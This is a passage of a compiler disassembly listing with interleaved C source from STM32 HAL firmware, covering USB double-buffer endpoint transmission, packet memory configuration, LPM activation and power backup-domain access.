 800353c:	68fb      	ldr	r3, [r7, #12]
 800353e:	681b      	ldr	r3, [r3, #0]
 8003540:	667b      	str	r3, [r7, #100]	; 0x64
 8003542:	68fb      	ldr	r3, [r7, #12]
 8003544:	681b      	ldr	r3, [r3, #0]
 8003546:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800354a:	b29b      	uxth	r3, r3
 800354c:	461a      	mov	r2, r3
 800354e:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8003550:	4413      	add	r3, r2
 8003552:	667b      	str	r3, [r7, #100]	; 0x64
 8003554:	68bb      	ldr	r3, [r7, #8]
 8003556:	781b      	ldrb	r3, [r3, #0]
 8003558:	00da      	lsls	r2, r3, #3
 800355a:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800355c:	4413      	add	r3, r2
 800355e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003562:	663b      	str	r3, [r7, #96]	; 0x60
 8003564:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 8003566:	2200      	movs	r2, #0
 8003568:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 800356a:	68fb      	ldr	r3, [r7, #12]
 800356c:	681b      	ldr	r3, [r3, #0]
 800356e:	677b      	str	r3, [r7, #116]	; 0x74
 8003570:	68bb      	ldr	r3, [r7, #8]
 8003572:	785b      	ldrb	r3, [r3, #1]
 8003574:	2b00      	cmp	r3, #0
 8003576:	d12b      	bne.n	80035d0 <HAL_PCD_EP_DB_Transmit+0x516>
 8003578:	68fb      	ldr	r3, [r7, #12]
 800357a:	681b      	ldr	r3, [r3, #0]
 800357c:	66fb      	str	r3, [r7, #108]	; 0x6c
 800357e:	68fb      	ldr	r3, [r7, #12]
 8003580:	681b      	ldr	r3, [r3, #0]
 8003582:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003586:	b29b      	uxth	r3, r3
 8003588:	461a      	mov	r2, r3
 800358a:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 800358c:	4413      	add	r3, r2
 800358e:	66fb      	str	r3, [r7, #108]	; 0x6c
 8003590:	68bb      	ldr	r3, [r7, #8]
 8003592:	781b      	ldrb	r3, [r3, #0]
 8003594:	00da      	lsls	r2, r3, #3
 8003596:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 8003598:	4413      	add	r3, r2
 800359a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800359e:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 80035a2:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80035a6:	881b      	ldrh	r3, [r3, #0]
 80035a8:	b29b      	uxth	r3, r3
 80035aa:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80035ae:	b29a      	uxth	r2, r3
 80035b0:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80035b4:	801a      	strh	r2, [r3, #0]
 80035b6:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80035ba:	881b      	ldrh	r3, [r3, #0]
 80035bc:	b29b      	uxth	r3, r3
 80035be:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80035c2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80035c6:	b29a      	uxth	r2, r3
 80035c8:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80035cc:	801a      	strh	r2, [r3, #0]
 80035ce:	e017      	b.n	8003600 <HAL_PCD_EP_DB_Transmit+0x546>
 80035d0:	68bb      	ldr	r3, [r7, #8]
 80035d2:	785b      	ldrb	r3, [r3, #1]
 80035d4:	2b01      	cmp	r3, #1
 80035d6:	d113      	bne.n	8003600 <HAL_PCD_EP_DB_Transmit+0x546>
 80035d8:	68fb      	ldr	r3, [r7, #12]
 80035da:	681b      	ldr	r3, [r3, #0]
 80035dc:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80035e0:	b29b      	uxth	r3, r3
 80035e2:	461a      	mov	r2, r3
 80035e4:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 80035e6:	4413      	add	r3, r2
 80035e8:	677b      	str	r3, [r7, #116]	; 0x74
 80035ea:	68bb      	ldr	r3, [r7, #8]
 80035ec:	781b      	ldrb	r3, [r3, #0]
 80035ee:	00da      	lsls	r2, r3, #3
 80035f0:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 80035f2:	4413      	add	r3, r2
 80035f4:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80035f8:	673b      	str	r3, [r7, #112]	; 0x70
 80035fa:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 80035fc:	2200      	movs	r2, #0
 80035fe:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8003600:	68bb      	ldr	r3, [r7, #8]
 8003602:	781b      	ldrb	r3, [r3, #0]
 8003604:	4619      	mov	r1, r3
 8003606:	68f8      	ldr	r0, [r7, #12]
 8003608:	f009 fa69 	bl	800cade <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 800360c:	88fb      	ldrh	r3, [r7, #6]
 800360e:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8003612:	2b00      	cmp	r3, #0
 8003614:	f040 811a 	bne.w	800384c <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003618:	68fb      	ldr	r3, [r7, #12]
 800361a:	681b      	ldr	r3, [r3, #0]
 800361c:	461a      	mov	r2, r3
 800361e:	68bb      	ldr	r3, [r7, #8]
 8003620:	781b      	ldrb	r3, [r3, #0]
 8003622:	009b      	lsls	r3, r3, #2
 8003624:	4413      	add	r3, r2
 8003626:	881b      	ldrh	r3, [r3, #0]
 8003628:	b29b      	uxth	r3, r3
 800362a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800362e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8003632:	f8a7 3088 	strh.w	r3, [r7, #136]	; 0x88
 8003636:	68fb      	ldr	r3, [r7, #12]
 8003638:	681b      	ldr	r3, [r3, #0]
 800363a:	461a      	mov	r2, r3
 800363c:	68bb      	ldr	r3, [r7, #8]
 800363e:	781b      	ldrb	r3, [r3, #0]
 8003640:	009b      	lsls	r3, r3, #2
 8003642:	441a      	add	r2, r3
 8003644:	f8b7 3088 	ldrh.w	r3, [r7, #136]	; 0x88
 8003648:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800364c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003650:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003654:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003658:	b29b      	uxth	r3, r3
 800365a:	8013      	strh	r3, [r2, #0]
 800365c:	e0f6      	b.n	800384c <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 800365e:	88fb      	ldrh	r3, [r7, #6]
 8003660:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8003664:	2b00      	cmp	r3, #0
 8003666:	d121      	bne.n	80036ac <HAL_PCD_EP_DB_Transmit+0x5f2>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003668:	68fb      	ldr	r3, [r7, #12]
 800366a:	681b      	ldr	r3, [r3, #0]
 800366c:	461a      	mov	r2, r3
 800366e:	68bb      	ldr	r3, [r7, #8]
 8003670:	781b      	ldrb	r3, [r3, #0]
 8003672:	009b      	lsls	r3, r3, #2
 8003674:	4413      	add	r3, r2
 8003676:	881b      	ldrh	r3, [r3, #0]
 8003678:	b29b      	uxth	r3, r3
 800367a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800367e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8003682:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 8003686:	68fb      	ldr	r3, [r7, #12]
 8003688:	681b      	ldr	r3, [r3, #0]
 800368a:	461a      	mov	r2, r3
 800368c:	68bb      	ldr	r3, [r7, #8]
 800368e:	781b      	ldrb	r3, [r3, #0]
 8003690:	009b      	lsls	r3, r3, #2
 8003692:	441a      	add	r2, r3
 8003694:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8003698:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800369c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80036a0:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80036a4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80036a8:	b29b      	uxth	r3, r3
 80036aa:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 80036ac:	68bb      	ldr	r3, [r7, #8]
 80036ae:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80036b2:	2b01      	cmp	r3, #1
 80036b4:	f040 80ca 	bne.w	800384c <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 80036b8:	68bb      	ldr	r3, [r7, #8]
 80036ba:	695a      	ldr	r2, [r3, #20]
 80036bc:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80036c0:	441a      	add	r2, r3
 80036c2:	68bb      	ldr	r3, [r7, #8]
 80036c4:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 80036c6:	68bb      	ldr	r3, [r7, #8]
 80036c8:	69da      	ldr	r2, [r3, #28]
 80036ca:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80036ce:	441a      	add	r2, r3
 80036d0:	68bb      	ldr	r3, [r7, #8]
 80036d2:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 80036d4:	68bb      	ldr	r3, [r7, #8]
 80036d6:	6a1a      	ldr	r2, [r3, #32]
 80036d8:	68bb      	ldr	r3, [r7, #8]
 80036da:	691b      	ldr	r3, [r3, #16]
 80036dc:	429a      	cmp	r2, r3
 80036de:	d30b      	bcc.n	80036f8 <HAL_PCD_EP_DB_Transmit+0x63e>
        {
          len = ep->maxpacket;
 80036e0:	68bb      	ldr	r3, [r7, #8]
 80036e2:	691b      	ldr	r3, [r3, #16]
 80036e4:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 80036e8:	68bb      	ldr	r3, [r7, #8]
 80036ea:	6a1a      	ldr	r2, [r3, #32]
 80036ec:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80036f0:	1ad2      	subs	r2, r2, r3
 80036f2:	68bb      	ldr	r3, [r7, #8]
 80036f4:	621a      	str	r2, [r3, #32]
 80036f6:	e017      	b.n	8003728 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else if (ep->xfer_len_db == 0U)
 80036f8:	68bb      	ldr	r3, [r7, #8]
 80036fa:	6a1b      	ldr	r3, [r3, #32]
 80036fc:	2b00      	cmp	r3, #0
 80036fe:	d108      	bne.n	8003712 <HAL_PCD_EP_DB_Transmit+0x658>
        {
          len = TxPctSize;
 8003700:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003704:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 8003708:	68bb      	ldr	r3, [r7, #8]
 800370a:	2200      	movs	r2, #0
 800370c:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8003710:	e00a      	b.n	8003728 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else
        {
          len = ep->xfer_len_db;
 8003712:	68bb      	ldr	r3, [r7, #8]
 8003714:	6a1b      	ldr	r3, [r3, #32]
 8003716:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 800371a:	68bb      	ldr	r3, [r7, #8]
 800371c:	2200      	movs	r2, #0
 800371e:	621a      	str	r2, [r3, #32]
          ep->xfer_fill_db = 0;
 8003720:	68bb      	ldr	r3, [r7, #8]
 8003722:	2200      	movs	r2, #0
 8003724:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
        }

        /* Set the Double buffer counter for pmabuffer1 */
        PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 8003728:	68fb      	ldr	r3, [r7, #12]
 800372a:	681b      	ldr	r3, [r3, #0]
 800372c:	657b      	str	r3, [r7, #84]	; 0x54
 800372e:	68bb      	ldr	r3, [r7, #8]
 8003730:	785b      	ldrb	r3, [r3, #1]
 8003732:	2b00      	cmp	r3, #0
 8003734:	d165      	bne.n	8003802 <HAL_PCD_EP_DB_Transmit+0x748>
 8003736:	68fb      	ldr	r3, [r7, #12]
 8003738:	681b      	ldr	r3, [r3, #0]
 800373a:	65fb      	str	r3, [r7, #92]	; 0x5c
 800373c:	68fb      	ldr	r3, [r7, #12]
 800373e:	681b      	ldr	r3, [r3, #0]
 8003740:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003744:	b29b      	uxth	r3, r3
 8003746:	461a      	mov	r2, r3
 8003748:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 800374a:	4413      	add	r3, r2
 800374c:	65fb      	str	r3, [r7, #92]	; 0x5c
 800374e:	68bb      	ldr	r3, [r7, #8]
 8003750:	781b      	ldrb	r3, [r3, #0]
 8003752:	00da      	lsls	r2, r3, #3
 8003754:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8003756:	4413      	add	r3, r2
 8003758:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800375c:	65bb      	str	r3, [r7, #88]	; 0x58
 800375e:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003760:	881b      	ldrh	r3, [r3, #0]
 8003762:	b29b      	uxth	r3, r3
 8003764:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003768:	b29a      	uxth	r2, r3
 800376a:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800376c:	801a      	strh	r2, [r3, #0]
 800376e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003772:	2b3e      	cmp	r3, #62	; 0x3e
 8003774:	d91d      	bls.n	80037b2 <HAL_PCD_EP_DB_Transmit+0x6f8>
 8003776:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800377a:	095b      	lsrs	r3, r3, #5
 800377c:	66bb      	str	r3, [r7, #104]	; 0x68
 800377e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003782:	f003 031f 	and.w	r3, r3, #31
 8003786:	2b00      	cmp	r3, #0
 8003788:	d102      	bne.n	8003790 <HAL_PCD_EP_DB_Transmit+0x6d6>
 800378a:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800378c:	3b01      	subs	r3, #1
 800378e:	66bb      	str	r3, [r7, #104]	; 0x68
 8003790:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003792:	881b      	ldrh	r3, [r3, #0]
 8003794:	b29a      	uxth	r2, r3
 8003796:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003798:	b29b      	uxth	r3, r3
 800379a:	029b      	lsls	r3, r3, #10
 800379c:	b29b      	uxth	r3, r3
 800379e:	4313      	orrs	r3, r2
 80037a0:	b29b      	uxth	r3, r3
 80037a2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80037a6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80037aa:	b29a      	uxth	r2, r3
 80037ac:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80037ae:	801a      	strh	r2, [r3, #0]
 80037b0:	e041      	b.n	8003836 <HAL_PCD_EP_DB_Transmit+0x77c>
 80037b2:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80037b6:	2b00      	cmp	r3, #0
 80037b8:	d10a      	bne.n	80037d0 <HAL_PCD_EP_DB_Transmit+0x716>
 80037ba:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80037bc:	881b      	ldrh	r3, [r3, #0]
 80037be:	b29b      	uxth	r3, r3
 80037c0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80037c4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80037c8:	b29a      	uxth	r2, r3
 80037ca:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80037cc:	801a      	strh	r2, [r3, #0]
 80037ce:	e032      	b.n	8003836 <HAL_PCD_EP_DB_Transmit+0x77c>
 80037d0:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80037d4:	085b      	lsrs	r3, r3, #1
 80037d6:	66bb      	str	r3, [r7, #104]	; 0x68
 80037d8:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80037dc:	f003 0301 	and.w	r3, r3, #1
 80037e0:	2b00      	cmp	r3, #0
 80037e2:	d002      	beq.n	80037ea <HAL_PCD_EP_DB_Transmit+0x730>
 80037e4:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80037e6:	3301      	adds	r3, #1
 80037e8:	66bb      	str	r3, [r7, #104]	; 0x68
 80037ea:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80037ec:	881b      	ldrh	r3, [r3, #0]
 80037ee:	b29a      	uxth	r2, r3
 80037f0:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80037f2:	b29b      	uxth	r3, r3
 80037f4:	029b      	lsls	r3, r3, #10
 80037f6:	b29b      	uxth	r3, r3
 80037f8:	4313      	orrs	r3, r2
 80037fa:	b29a      	uxth	r2, r3
 80037fc:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80037fe:	801a      	strh	r2, [r3, #0]
 8003800:	e019      	b.n	8003836 <HAL_PCD_EP_DB_Transmit+0x77c>
 8003802:	68bb      	ldr	r3, [r7, #8]
 8003804:	785b      	ldrb	r3, [r3, #1]
 8003806:	2b01      	cmp	r3, #1
 8003808:	d115      	bne.n	8003836 <HAL_PCD_EP_DB_Transmit+0x77c>
 800380a:	68fb      	ldr	r3, [r7, #12]
 800380c:	681b      	ldr	r3, [r3, #0]
 800380e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003812:	b29b      	uxth	r3, r3
 8003814:	461a      	mov	r2, r3
 8003816:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8003818:	4413      	add	r3, r2
 800381a:	657b      	str	r3, [r7, #84]	; 0x54
 800381c:	68bb      	ldr	r3, [r7, #8]
 800381e:	781b      	ldrb	r3, [r3, #0]
 8003820:	00da      	lsls	r2, r3, #3
 8003822:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8003824:	4413      	add	r3, r2
 8003826:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800382a:	653b      	str	r3, [r7, #80]	; 0x50
 800382c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003830:	b29a      	uxth	r2, r3
 8003832:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8003834:	801a      	strh	r2, [r3, #0]

        /* Copy the user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr1, (uint16_t)len);
 8003836:	68fb      	ldr	r3, [r7, #12]
 8003838:	6818      	ldr	r0, [r3, #0]
 800383a:	68bb      	ldr	r3, [r7, #8]
 800383c:	6959      	ldr	r1, [r3, #20]
 800383e:	68bb      	ldr	r3, [r7, #8]
 8003840:	895a      	ldrh	r2, [r3, #10]
 8003842:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003846:	b29b      	uxth	r3, r3
 8003848:	f004 fee7 	bl	800861a <USB_WritePMA>
      }
    }
  }

  /*enable endpoint IN*/
  PCD_SET_EP_TX_STATUS(hpcd->Instance, ep->num, USB_EP_TX_VALID);
 800384c:	68fb      	ldr	r3, [r7, #12]
 800384e:	681b      	ldr	r3, [r3, #0]
 8003850:	461a      	mov	r2, r3
 8003852:	68bb      	ldr	r3, [r7, #8]
 8003854:	781b      	ldrb	r3, [r3, #0]
 8003856:	009b      	lsls	r3, r3, #2
 8003858:	4413      	add	r3, r2
 800385a:	881b      	ldrh	r3, [r3, #0]
 800385c:	b29b      	uxth	r3, r3
 800385e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8003862:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8003866:	82bb      	strh	r3, [r7, #20]
 8003868:	8abb      	ldrh	r3, [r7, #20]
 800386a:	f083 0310 	eor.w	r3, r3, #16
 800386e:	82bb      	strh	r3, [r7, #20]
 8003870:	8abb      	ldrh	r3, [r7, #20]
 8003872:	f083 0320 	eor.w	r3, r3, #32
 8003876:	82bb      	strh	r3, [r7, #20]
 8003878:	68fb      	ldr	r3, [r7, #12]
 800387a:	681b      	ldr	r3, [r3, #0]
 800387c:	461a      	mov	r2, r3
 800387e:	68bb      	ldr	r3, [r7, #8]
 8003880:	781b      	ldrb	r3, [r3, #0]
 8003882:	009b      	lsls	r3, r3, #2
 8003884:	441a      	add	r2, r3
 8003886:	8abb      	ldrh	r3, [r7, #20]
 8003888:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800388c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003890:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8003894:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003898:	b29b      	uxth	r3, r3
 800389a:	8013      	strh	r3, [r2, #0]

  return HAL_OK;
 800389c:	2300      	movs	r3, #0
}
 800389e:	4618      	mov	r0, r3
 80038a0:	3790      	adds	r7, #144	; 0x90
 80038a2:	46bd      	mov	sp, r7
 80038a4:	bd80      	pop	{r7, pc}

080038a6 <HAL_PCDEx_PMAConfig>:
  * @retval HAL status
  */

HAL_StatusTypeDef  HAL_PCDEx_PMAConfig(PCD_HandleTypeDef *hpcd, uint16_t ep_addr,
                                       uint16_t ep_kind, uint32_t pmaadress)
{
 80038a6:	b480      	push	{r7}
 80038a8:	b087      	sub	sp, #28
 80038aa:	af00      	add	r7, sp, #0
 80038ac:	60f8      	str	r0, [r7, #12]
 80038ae:	607b      	str	r3, [r7, #4]
 80038b0:	460b      	mov	r3, r1
 80038b2:	817b      	strh	r3, [r7, #10]
 80038b4:	4613      	mov	r3, r2
 80038b6:	813b      	strh	r3, [r7, #8]
  PCD_EPTypeDef *ep;

  /* initialize ep structure*/
  if ((0x80U & ep_addr) == 0x80U)
 80038b8:	897b      	ldrh	r3, [r7, #10]
 80038ba:	f003 0380 	and.w	r3, r3, #128	; 0x80
 80038be:	b29b      	uxth	r3, r3
 80038c0:	2b00      	cmp	r3, #0
 80038c2:	d00b      	beq.n	80038dc <HAL_PCDEx_PMAConfig+0x36>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80038c4:	897b      	ldrh	r3, [r7, #10]
 80038c6:	f003 0307 	and.w	r3, r3, #7
 80038ca:	1c5a      	adds	r2, r3, #1
 80038cc:	4613      	mov	r3, r2
 80038ce:	009b      	lsls	r3, r3, #2
 80038d0:	4413      	add	r3, r2
 80038d2:	00db      	lsls	r3, r3, #3
 80038d4:	68fa      	ldr	r2, [r7, #12]
 80038d6:	4413      	add	r3, r2
 80038d8:	617b      	str	r3, [r7, #20]
 80038da:	e009      	b.n	80038f0 <HAL_PCDEx_PMAConfig+0x4a>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 80038dc:	897a      	ldrh	r2, [r7, #10]
 80038de:	4613      	mov	r3, r2
 80038e0:	009b      	lsls	r3, r3, #2
 80038e2:	4413      	add	r3, r2
 80038e4:	00db      	lsls	r3, r3, #3
 80038e6:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80038ea:	68fa      	ldr	r2, [r7, #12]
 80038ec:	4413      	add	r3, r2
 80038ee:	617b      	str	r3, [r7, #20]
  }

  /* Here we check if the endpoint is single or double Buffer*/
  if (ep_kind == PCD_SNG_BUF)
 80038f0:	893b      	ldrh	r3, [r7, #8]
 80038f2:	2b00      	cmp	r3, #0
 80038f4:	d107      	bne.n	8003906 <HAL_PCDEx_PMAConfig+0x60>
  {
    /* Single Buffer */
    ep->doublebuffer = 0U;
 80038f6:	697b      	ldr	r3, [r7, #20]
 80038f8:	2200      	movs	r2, #0
 80038fa:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaadress = (uint16_t)pmaadress;
 80038fc:	687b      	ldr	r3, [r7, #4]
 80038fe:	b29a      	uxth	r2, r3
 8003900:	697b      	ldr	r3, [r7, #20]
 8003902:	80da      	strh	r2, [r3, #6]
 8003904:	e00b      	b.n	800391e <HAL_PCDEx_PMAConfig+0x78>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  else /* USB_DBL_BUF */
  {
    /* Double Buffer Endpoint */
    ep->doublebuffer = 1U;
 8003906:	697b      	ldr	r3, [r7, #20]
 8003908:	2201      	movs	r2, #1
 800390a:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaaddr0 = (uint16_t)(pmaadress & 0xFFFFU);
 800390c:	687b      	ldr	r3, [r7, #4]
 800390e:	b29a      	uxth	r2, r3
 8003910:	697b      	ldr	r3, [r7, #20]
 8003912:	811a      	strh	r2, [r3, #8]
    ep->pmaaddr1 = (uint16_t)((pmaadress & 0xFFFF0000U) >> 16);
 8003914:	687b      	ldr	r3, [r7, #4]
 8003916:	0c1b      	lsrs	r3, r3, #16
 8003918:	b29a      	uxth	r2, r3
 800391a:	697b      	ldr	r3, [r7, #20]
 800391c:	815a      	strh	r2, [r3, #10]
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 800391e:	2300      	movs	r3, #0
}
 8003920:	4618      	mov	r0, r3
 8003922:	371c      	adds	r7, #28
 8003924:	46bd      	mov	sp, r7
 8003926:	f85d 7b04 	ldr.w	r7, [sp], #4
 800392a:	4770      	bx	lr

0800392c <HAL_PCDEx_ActivateLPM>:
  * @brief  Activate LPM feature.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCDEx_ActivateLPM(PCD_HandleTypeDef *hpcd)
{
 800392c:	b480      	push	{r7}
 800392e:	b085      	sub	sp, #20
 8003930:	af00      	add	r7, sp, #0
 8003932:	6078      	str	r0, [r7, #4]

  USB_TypeDef *USBx = hpcd->Instance;
 8003934:	687b      	ldr	r3, [r7, #4]
 8003936:	681b      	ldr	r3, [r3, #0]
 8003938:	60fb      	str	r3, [r7, #12]
  hpcd->lpm_active = 1U;
 800393a:	687b      	ldr	r3, [r7, #4]
 800393c:	2201      	movs	r2, #1
 800393e:	f8c3 22ec 	str.w	r2, [r3, #748]	; 0x2ec
  hpcd->LPM_State = LPM_L0;
 8003942:	687b      	ldr	r3, [r7, #4]
 8003944:	2200      	movs	r2, #0
 8003946:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0

  USBx->LPMCSR |= USB_LPMCSR_LMPEN;
 800394a:	68fb      	ldr	r3, [r7, #12]
 800394c:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 8003950:	b29b      	uxth	r3, r3
 8003952:	f043 0301 	orr.w	r3, r3, #1
 8003956:	b29a      	uxth	r2, r3
 8003958:	68fb      	ldr	r3, [r7, #12]
 800395a:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54
  USBx->LPMCSR |= USB_LPMCSR_LPMACK;
 800395e:	68fb      	ldr	r3, [r7, #12]
 8003960:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 8003964:	b29b      	uxth	r3, r3
 8003966:	f043 0302 	orr.w	r3, r3, #2
 800396a:	b29a      	uxth	r2, r3
 800396c:	68fb      	ldr	r3, [r7, #12]
 800396e:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54

  return HAL_OK;
 8003972:	2300      	movs	r3, #0
}
 8003974:	4618      	mov	r0, r3
 8003976:	3714      	adds	r7, #20
 8003978:	46bd      	mov	sp, r7
 800397a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800397e:	4770      	bx	lr

08003980 <HAL_PWR_EnableBkUpAccess>:
  * @note  LSEON bit that switches on and off the LSE crystal belongs as well to the
  *        back-up domain.
  * @retval None
  */
void HAL_PWR_EnableBkUpAccess(void)
{
 8003980:	b480      	push	{r7}
 8003982:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8003984:	4b05      	ldr	r3, [pc, #20]	; (800399c <HAL_PWR_EnableBkUpAccess+0x1c>)
 8003986:	681b      	ldr	r3, [r3, #0]
 8003988:	4a04      	ldr	r2, [pc, #16]	; (800399c <HAL_PWR_EnableBkUpAccess+0x1c>)
 800398a:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 800398e:	6013      	str	r3, [r2, #0]
}
 8003990:	bf00      	nop
 8003992:	46bd      	mov	sp, r7
 8003994:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003998:	4770      	bx	lr
 800399a:	bf00      	nop
 800399c:	40007000 	.word	0x40007000

080039a0 <HAL_PWREx_GetVoltageRange>:
  * @brief Return Voltage Scaling Range.
  * @retval VOS bit field (PWR_REGULATOR_VOLTAGE_SCALE1 or PWR_REGULATOR_VOLTAGE_SCALE2
  *         or PWR_REGULATOR_VOLTAGE_SCALE1_BOOST when applicable)
  */
